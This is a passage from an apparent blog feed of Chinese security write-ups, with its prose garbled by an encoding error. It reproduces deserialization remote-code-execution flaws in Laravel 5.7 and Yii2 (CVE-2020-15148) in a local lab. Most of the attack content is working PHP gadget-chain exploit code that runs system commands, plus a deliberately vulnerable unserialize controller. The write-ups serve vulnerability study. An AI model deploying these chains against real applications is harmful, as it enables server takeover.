src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/155543.png" class=""><p>åœ¨è¿™é‡Œå¯¹ç±»çš„åŠ è½½æœ‰ä¸ªç–‘é—®ï¼Œåæ¥åœ¨ä¸€ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°äº†ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/100933.png" class=""><p><code>attributes</code>æ˜¯å¯æ§çš„ï¼Œå› æ­¤ç›´æ¥æ„é€ å³å¯ã€‚<br>è€Œä¸”ï¼Œä¼šå‘ç°<code>mockConsoleOutput()</code>æ–¹æ³•ä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„ä»£ç ï¼š</p><pre><code>foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123;</code></pre><p>å› æ­¤æ„é€ ï¼š</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>è¿˜æ˜¯æŠ¥é”™ï¼š</p><pre><code>â€œCall to a member function bind() on nullâ€</code></pre><p>æ„æ€æ˜¯åœ¨nullä¸Šè°ƒç”¨æˆå‘˜å‡½æ•°bind()</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/084006.png" class=""><p>åŸå› åº”è¯¥æ˜¯æ²¡æœ‰æ„é€ $this-&gt;appï¼Œçœ‹ä¸€ä¸‹app:</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/084501.png" class=""><p>ç»§ç»­æ„é€ ï¼š</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>ç»§ç»­æŠ¥é”™ï¼š</p><pre><code>Target [Illuminate\Contracts\Console\Kernel] is not instantiable</code></pre><p>æ­¤æ—¶å°±åˆ°äº†è¿™æ¡é“¾ä¸Šæœ€å›°éš¾çš„ç‚¹ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/101803.png" class=""><p><code>Kernel::class</code>æ˜¯å®Œå…¨é™å®šåç§°ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªç±»çš„å®Œæ•´çš„å¸¦ä¸Šå‘½åç©ºé—´çš„ç±»åï¼Œåœ¨laravelè¿™é‡Œæ˜¯<code>Illuminate\Contracts\Console\Kernel</code>ã€‚</p><p>æ‰“æ–­ç‚¹è·Ÿè¿›ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/102333.png" class=""><p>è·Ÿè¿›åˆ°çˆ¶ç±»çš„make()ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/102557.png" class=""><p>è·Ÿè¿›åˆ°resolve()ï¼š</p><pre><code>protected function resolve($abstract, $parameters = [])    &#123;        $abstract = $this-&gt;getAlias($abstract);        $needsContextualBuild = ! empty($parameters) || ! is_null(            $this-&gt;getContextualConcrete($abstract)        );        if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;            return $this-&gt;instances[$abstract];        &#125;        $this-&gt;with[] = $parameters;        $concrete = $this-&gt;getConcrete($abstract);        if ($this-&gt;isBuildable($concrete, $abstract)) &#123;            $object = $this-&gt;build($concrete);        &#125; else &#123;            $object = $this-&gt;make($concrete);        &#125;        foreach ($this-&gt;getExtenders($abstract) as $extender) &#123;            $object = $extender($object, $this);        &#125;        if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;            $this-&gt;instances[$abstract] = $object;        &#125;        $this-&gt;fireResolvingCallbacks($abstract, $object);        $this-&gt;resolved[$abstract] = true;        array_pop($this-&gt;with);        return $object;    &#125;</code></pre><p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆä¼šè¿”å›ä¸€ä¸ªobjectï¼Œæˆ‘ä»¬æ˜¯è¦è°ƒç”¨è¿™ä¸ªobjectçš„callæ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå…¨å±€æŸ¥æ‰¾ä¸€ä¸‹ï¼Œè¿™ä¸ªæ‰§è¡Œå‘½ä»¤çš„callæ–¹æ³•åˆ°åº•åœ¨å“ªä¸ªç±»ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/103803.png" class=""><p>å‘ç°åœ¨containerç±»é‡Œï¼Œè€Œæ„é€ çš„appçš„ç±»æ˜¯Applicationç±»ï¼Œè¿™ä¸ªç±»æ­£å¥½ä¹Ÿæ˜¯containerç±»çš„å­ç±»ï¼Œæ‰€ä»¥æœ€ç»ˆè¿”å›è¿™ä¸ªApplicationçš„å®ä¾‹å°±å¯ä»¥äº†ã€‚</p><p>å†æ¥çœ‹ä¸€ä¸‹resolve()æ–¹æ³•çš„ä»£ç ï¼š</p><p>$concrete &#x3D; $this-&gt;getConcrete($abstract);</p><pre><code>    protected function getConcrete($abstract)    &#123;        if (! is_null($concrete = $this-&gt;getContextualConcrete($abstract))) &#123;            return $concrete;        &#125;        // If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just        // assume each type is a concrete name and will attempt to resolve it as is        // since the container should be able to resolve concretes automatically.        if (isset($this-&gt;bindings[$abstract])) &#123;            return $this-&gt;bindings[$abstract][&#39;concrete&#39;];        &#125;        return $abstract;    &#125;</code></pre><p>ç¬¬ä¸€ä¸ªifæˆç«‹ä¸äº†ï¼Œä¸»è¦çœ‹ç¬¬äºŒä¸ªifï¼Œå› ä¸ºbindingsæ˜¯containerçš„å±æ€§ï¼Œè€Œè¿™é‡Œçš„$thiså…¶å®å°±æ˜¯æˆ‘ä»¬ä¼ çš„appï¼Œappçš„ç±»æ­£å¥½æ˜¯containerçš„å­ç±»ï¼Œæ‰€ä»¥bindingsçš„å±æ€§åŒæ ·å¯æ§ï¼Œå› æ­¤getConcrete()å‡½æ•°çš„è¿”å›å€¼æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚</p><p><code>getConcrete()</code>å‡½æ•°ä¹‹åæ˜¯è¿™ä¸ªï¼š</p><pre><code>    if ($this-&gt;isBuildable($concrete, $abstract)) &#123;        $object = $this-&gt;build($concrete);    &#125; else &#123;        $object = $this-&gt;make($concrete);    &#125;protected function isBuildable($concrete, $abstract)&#123;    return $concrete === $abstract || $concrete instanceof Closure;&#125;</code></pre><p>è¿™é‡Œçš„$concreteæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè€Œ$abstractæ˜¯Illuminate\Contracts\Console\Kernelã€‚ç»è¿‡æ‰“æ–­ç‚¹æµ‹è¯•ï¼Œ$this-&gt;build($concrete)å¾—åˆ°çš„ç»“æœåŸºæœ¬å°±æ˜¯æœ€ç»ˆè¿™ä¸ªget the value of offsetè¿”å›çš„äº†ï¼Œå› æ­¤è¦æƒ³åŠæ³•è®©$concreteæ˜¯Illuminate\Foundation\Applicationï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹å¤§ä½¬ä»¬çš„poc:</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;        protected $bindings = [];        public function __construct()&#123;            $this-&gt;bindings=array(                &#39;Illuminate\Contracts\Console\Kernel&#39;=&gt;array(                    &#39;concrete&#39;=&gt;&#39;Illuminate\Foundation\Application&#39;                )            );        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>è¿™æ ·åˆ°äº†</p><pre><code>    if ($this-&gt;isBuildable($concrete, $abstract)) &#123;        $object = $this-&gt;build($concrete);    &#125; else &#123;        $object = $this-&gt;make($concrete);    &#125;</code></pre><p>çš„æ—¶å€™ï¼Œ$concreteæ˜¯Illuminate\Foundation\Applicationï¼Œ$abstractæ˜¯Illuminate\Contracts\Console\Kernelï¼Œæ— æ³•isBuildableï¼Œè¿˜ä¼šå†è¿›å…¥ä¸€æ¬¡makeï¼Œä¸è¿‡è¿™æ¬¡makeä¸­çš„$concreteå°±æ˜¯æˆ‘ä»¬æ„é€ çš„äº†ã€‚è¿›å…¥makeï¼Œç„¶åå†è¿›å…¥resolveï¼Œå†è¿›å…¥getConcrete()æ–¹æ³•:</p><pre><code>    if (isset($this-&gt;bindings[$abstract])) &#123;       return $this-&gt;bindings[$abstract][&#39;concrete&#39;];    &#125;    return $abstract;</code></pre><p>ä¸å­˜åœ¨$this-&gt;bindings[â€˜Illuminate\Foundation\Applicationâ€™]ï¼Œæ‰€ä»¥ä¼šç›´æ¥return Illuminate\Foundation\Applicationï¼Œè¿™æ ·$abstractä¹Ÿæ˜¯Illuminate\Foundation\Applicationäº†,æœ€ç»ˆ<code>$this-&gt;app[Kernel::class]</code>è¿”å›çš„å°±æ˜¯å®ä¾‹åŒ–çš„<code>Illuminate\Foundation\Application</code>ç±»äº†ã€‚ç„¶åå¼€å§‹è°ƒç”¨callæ–¹æ³•,æœ€ç»ˆæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/111438.png" class=""><p>å‚è€ƒé“¾æ¥:<a href="https://blog.csdn.net/rfrder/article/details/113826483">https://blog.csdn.net/rfrder/article/details/113826483</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yii2æ¡†æ¶ååºåˆ—åŒ–æ¼æ´å¤ç°</title>
      <link href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹ï¼š"><a href="#ç®€ä»‹ï¼š" class="headerlink" title="ç®€ä»‹ï¼š"></a>ç®€ä»‹ï¼š</h2><p>Yii Frameworkæ˜¯ä¸€ä¸ªåŸºäºç»„ä»¶ã€ç”¨äºå¼€å‘å¤§å‹Webåº”ç”¨çš„é«˜æ€§èƒ½ PHP æ¡†æ¶ã€‚Yiiæä¾›äº†ä»Šæ—¥Web 2.0åº”ç”¨å¼€å‘æ‰€éœ€è¦çš„å‡ ä¹ä¸€åˆ‡åŠŸèƒ½ã€‚Yiiæ˜¯æœ€æœ‰æ•ˆç‡çš„PHPæ¡†æ¶ä¹‹ä¸€ã€‚</p><p>Yii2 2.0.38 ä¹‹å‰çš„ç‰ˆæœ¬å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œç¨‹åºåœ¨è°ƒç”¨unserialize æ—¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ ç‰¹å®šçš„æ¶æ„è¯·æ±‚æ‰§è¡Œä»»æ„å‘½ä»¤ï¼ŒCVEç¼–å·æ˜¯CVE-2020-15148</p><h2 id="ç¯å¢ƒéƒ¨ç½²ï¼š"><a href="#ç¯å¢ƒéƒ¨ç½²ï¼š" class="headerlink" title="ç¯å¢ƒéƒ¨ç½²ï¼š"></a>ç¯å¢ƒéƒ¨ç½²ï¼š</h2><p>ä¸‹è½½åœ°å€ï¼š</p><pre><code>https://github.com/yiisoft/yii2/releases/tag/2.0.37//ä¸‹è½½yii-basic-app-2.0.37.tgz</code></pre><p> ä¿®æ”¹&#x2F;config&#x2F;web.phpæ–‡ä»¶17è¡ŒcookieValidationKey,å€¼å¯ä»¥ä¸ºä»»ä½•</p><p>è¿›å…¥ç›®å½•ï¼Œæ‰§è¡Œphp yii serve</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/164228.png" class=""><p>æ­¤æ—¶å°±å¯ä»¥è¿›å…¥<a href="http://localhost:8080/">http://localhost:8080/</a></p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/164825.png" class=""><h2 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h2><p>æ¼æ´çš„å‡ºå‘ç‚¹æ˜¯åœ¨<code>\yii\vendor\yiisoft\yii2\db\BatchQueryResult.php</code>æ–‡ä»¶ä¸­</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/192033.png" class=""><p>ä½†æ˜¯ç»§ç»­è·Ÿè¿›close()ï¼Œå‘ç°æ²¡ä»€ä¹ˆåˆ©ç”¨çš„æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œçš„__dataReaderæ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆè°ƒç”¨äº†closeçš„æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡è§¦å‘__callæ–¹æ³•æ¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p>å…¨å±€æœç´¢ä¸€ä¸‹__callæ–¹æ³•ï¼Œåœ¨<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>å­˜åœ¨åˆé€‚__callçš„æ–¹æ³•ï¼š</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/193357.png" class=""><p>å› ä¸ºcloseæ˜¯æ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥__callä¸­çš„<code>$method</code>æ˜¯close,<code>attributes</code>ä¸ºç©ºã€‚ç»§ç»­è·Ÿè¿›formatæ–¹æ³•ï¼š</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/193848.png" class=""><p>(<code>call_user_func_array</code>ï¼šè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°)</p><p>è·Ÿè¿›getFormatter:</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/194251.png" class=""><p>å› ä¸º$this-&gt;formattersæ˜¯å¯æ§çš„ï¼Œå› æ­¤getFormatteræ–¹æ³•çš„è¿”å›å€¼ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤call_user_func_array($this-&gt;getFormatter($formatter), $arguments);ä¸­ï¼Œå›è°ƒå‡½æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä½†æ˜¯$argumentsä¸ºç©ºï¼Œæ‰€ä»¥ç›¸å½“äºæˆ‘ä»¬ç°åœ¨èƒ½å¹²ä¸¤ä»¶äº‹ï¼Œå¯ä»¥è°ƒç”¨yii2ä¸­ä»»æ„çš„ä¸€ä¸ªæ— å‚æ–¹æ³•ï¼Œæˆ–è€…è°ƒç”¨åŸç”Ÿphpçš„ç±»ä¼¼phpinfo()è¿™æ ·çš„æ— å‚æ–¹æ³•ï¼Œä½†æ˜¯ç¬¬äºŒç§è‚¯å®šä¸èƒ½RCEï¼Œå› æ­¤è¿˜è¦åœ¨yii2ä¸­å·²æœ‰çš„æ— å‚æ–¹æ³•ä¸­è¿›è¡ŒæŒ–æ˜ï¼ˆç›´æ¥æœç´¢å«æœ‰call_user_functionçš„æ— å‚å‡½æ•°ï¼‰ï¼š<br>æ„é€ æ­£åˆ™ï¼š</p><pre><code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code></pre><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/201701.png" class=""><p>å…¶ä¸­æœ‰ä¸¤ä¸ªç±»ä¸­çš„<code>run</code>æ–¹æ³•å¯ç”¨ï¼š</p><p><code>yii\rest\CreateAction::run()</code>ï¼Œ<code>$this-&gt;checkAccess, $this-&gt;id</code>ä¸¤ä¸ªå‚æ•°å¯æ§</p><p><code>\yii\rest\IndexAction::run()</code>ï¼Œ<code>$this-&gt;checkAccess, $this-&gt;id</code>ä¸¤ä¸ªå‚æ•°å¯æ§</p><p>è‡³æ­¤æ¢³ç†ä¸€ä¸‹popé“¾ï¼š</p><pre><code>class BatchQueryResult  -&gt;__destruct()â†“â†“â†“class BatchQueryResult  -&gt;reset()â†“â†“â†“class Generator  -&gt;__call()â†“â†“â†“class Generator  -&gt;format()â†“â†“â†“class Generator  -&gt;getFormatter()â†“â†“â†“class IndexAction  -&gt;run()</code></pre><p>è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„ä¸€å¼ å›¾ï¼š</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/202329.png" class=""><p>ç¬¬ä¸€æ­¥ï¼šnewäº†ä¸€ä¸ªyii\db\BatchQueryResult()ç±»ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨è¿™ä¸ªç±»çš„__construct()æ–¹æ³•</p><p>ç¬¬äºŒæ­¥ï¼šè¿™ä¸ªç±»çš„__construct()æ–¹æ³•ä¼šnewä¸€ä¸ªFaker\Generator()ç±»ï¼Œå°±åˆä¼šè°ƒç”¨Faker\Generator()ç±»çš„__construct()æ–¹æ³•ï¼Œå¹¶æŠŠè¿™ä¸ªå¯¹è±¡èµ‹å€¼ç»™$_dataReaderå˜é‡ã€‚</p><p>ç¬¬ä¸‰æ­¥ï¼šFaker\Generator()ç±»çš„__construct()æ–¹æ³•ä¼šnewä¸€ä¸ªyii\rest\CreateAction()ç±»ï¼Œç„¶ååˆè°ƒç”¨yii\rest\CreateAction()ç±»çš„__coustrcut()æ–¹æ³•ã€‚å¹¶è°ƒç”¨äº†runæ–¹æ³•ï¼ˆè¿™é‡Œç”¨äº† call_user_func_arrayåé¢ä¼šè®²åˆ°ï¼‰ï¼Œç„¶åèµ‹å€¼ç»™$this-&gt;formatters[â€˜closeâ€™]ã€‚</p><p>ç¬¬å››æ­¥ï¼šååºåˆ—åŒ–æ—¶ï¼Œç±»ä¸­å˜é‡çš„å€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼›é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡yii\rest\CreateAction()ç±»çš„__construct()æ–¹æ³•ä¸­ä¿®æ”¹è¿™äº›å˜é‡ï¼Œå°†è¿™äº›å€¼æ”¹æˆå‘½ä»¤ï¼ŒæˆåŠŸRCEã€‚</p><h2 id="å¤ç°ï¼š"><a href="#å¤ç°ï¼š" class="headerlink" title="å¤ç°ï¼š"></a>å¤ç°ï¼š</h2><p>è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¸€ä¸ªååºåˆ—åŒ–çš„å…¥å£ç‚¹</p><p>åœ¨controllersç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªTestController.php:</p><pre><code>&lt;?phpnamespace app\controllers; class TestController extends \yii\web\Controller&#123;    public function actionTest($data)&#123;        return unserialize(base64_decode($data));    &#125;&#125;?&gt;</code></pre><p>å¤§ä½¬ä»¬çš„pocï¼š</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;dir&#39;;        &#125;    &#125;&#125;namespace Faker &#123;    use yii\rest\IndexAction;    class Generator    &#123;        protected $formatters;        public function __construct()        &#123;            $this-&gt;formatters[&#39;close&#39;] = [new IndexAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()        &#123;            $this-&gt;_dataReader=new Generator();        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre><p>å…¶ä»–é“¾å­ï¼š</p><p>yiii 2.0.38</p><p>poc2</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning            $this-&gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;// poc2namespace Codeception\Extension&#123;    use Faker\Generator;    class RunProcess&#123;        private $processes;        public function __construct()        &#123;            $this-&gt;processes = [new Generator()];        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));&#125;?&gt;</code></pre><p>poc3</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;dir&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // è¿™é‡Œéœ€è¦æ”¹ä¸ºrender            $this-&gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace phpDocumentor\Reflection\DocBlock\Tags&#123;    use Faker\Generator;    class See&#123;        protected $description;        public function __construct()        &#123;            $this-&gt;description = new Generator();        &#125;    &#125;&#125;namespace&#123;    use phpDocumentor\Reflection\DocBlock\Tags\See;    class Swift_KeyCache_DiskKeyCache&#123;        private $keys = [];        private $path;        public function __construct()        &#123;            $this-&gt;path = new See;            $this-&gt;keys = array(                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)            );        &#125;    &#125;    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt;</code></pre><p>yii 2.0.42</p><p>poc4</p><pre><code>&lt;?phpnamespace Faker;class DefaultGenerator&#123;    protected $default ;    function __construct($argv)    &#123;        $this-&gt;default = $argv;    &#125;&#125;class ValidGenerator&#123;    protected $generator;    protected $validator;    protected $maxRetries;    function __construct($command,$argv)    &#123;        $this-&gt;generator = new DefaultGenerator($argv);        $this-&gt;validator = $command;        $this-&gt;maxRetries = 99999999;    &#125;&#125;namespace Codeception\Extension;use Faker\ValidGenerator;class RunProcess&#123;    private $processes = [];    function __construct($command,$argv)    &#123;        $this-&gt;processes[] = new ValidGenerator($command,$argv);    &#125;&#125;$exp = new RunProcess(&#39;system&#39;,&#39;whoami&#39;);echo(base64_encode(serialize($exp)));</code></pre><p>poc5</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        function __construct()        &#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;whoami&#39;;        &#125;    &#125;&#125;namespace Symfony\Component\String&#123;    use yii\rest\IndexAction;    class LazyString    &#123;        function __construct()        &#123;            $this-&gt;value = [new indexAction(), &quot;run&quot;];        &#125;    &#125;     class UnicodeString    &#123;        function __construct()        &#123;            $this-&gt;value = new LazyString();        &#125;    &#125;&#125;namespace Faker&#123;    use Symfony\Component\String\LazyString;    class DefaultGenerator    &#123;        function __construct()        &#123;            $this-&gt;default = new LazyString();        &#125;    &#125;    class UniqueGenerator    &#123;        function __construct()        &#123;            $this-&gt;generator = new DefaultGenerator();            $this-&gt;maxRetries = 99999999;        &#125;    &#125;&#125;namespace Codeception\Extension&#123;    use Faker\UniqueGenerator;    class RunProcess    &#123;        function __construct()        &#123;            $this-&gt;processes[] = new UniqueGenerator();        &#125;    &#125;&#125;namespace&#123;    use Codeception\Extension\RunProcess;    $exp = new RunProcess();    echo(base64_encode(serialize($exp)));&#125;</code></pre><p>yii 2.2.37</p><p>poc2</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;whoami&#39;;        &#125;    &#125;&#125;namespace yii\db&#123;    use yii\web\DbSession;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader=new DbSession();        &#125;    &#125;&#125;namespace yii\web&#123;    use yii\rest\IndexAction;    class DbSession    &#123;        public $writeCallback;        public function __construct()&#123;            $a=new IndexAction();            $this-&gt;writeCallback=[$a,&#39;run&#39;];        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> yii </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpååºåˆ—åŒ–</title>
      <link href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
